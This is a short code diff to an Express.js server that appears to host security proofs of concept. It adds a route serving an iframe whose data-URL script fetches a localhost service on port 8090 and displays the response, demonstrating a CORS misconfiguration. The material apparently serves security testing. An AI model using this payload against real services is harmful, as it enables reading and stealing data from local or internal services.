@@ -15,8 +15,15 @@ app.get("/poc", function (req, res) {
   res.sendFile(path.join(__dirname, "poc.html"));
 });
 
+app.get("/CORSMisconfigurationCodeWithChrome", function (req, res) {
+   res.send(`<iframe src="data:text/html,<script>fetch('http://127.0.0.1:8090').then(a=>a.text()).then(content=>{console.log(content);alert(content)})</script>">`);
+});
+
+  
 
 
+
+    
 app.get("/blind", function (req, res) {
   const forwarded = req.headers["x-forwarded-for"];
   const ip = req.ip;
